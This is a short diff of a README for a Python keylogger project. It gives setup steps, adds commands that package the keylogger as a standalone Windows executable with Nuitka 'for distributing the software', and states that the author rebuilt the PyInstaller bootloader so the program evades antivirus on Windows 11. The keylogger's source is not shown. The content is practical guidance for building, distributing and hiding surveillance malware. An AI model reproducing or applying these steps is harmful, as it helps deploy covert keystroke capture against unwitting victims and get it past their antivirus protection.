@@ -9,5 +9,8 @@
 4. Run command `keylogger_env\Scripts\activate`
 5. Run the command `pip install -r requirements.txt` to install all the packages required in your virtual environment.
 6. Run `py keylogger.py` this will run the program.
+7. py to exe  converter can also be used for distributing the software
+8. pip install Nuitka
+9. python -m nuitka --mingw64 keylogger.py --standalone --onefile
 
 ### To get the file to run on Windows 11 evading the antivirus I compiled the PyInstaller bootloader locally using Microsoft C/C++ compiler, and then used it to compile the code.
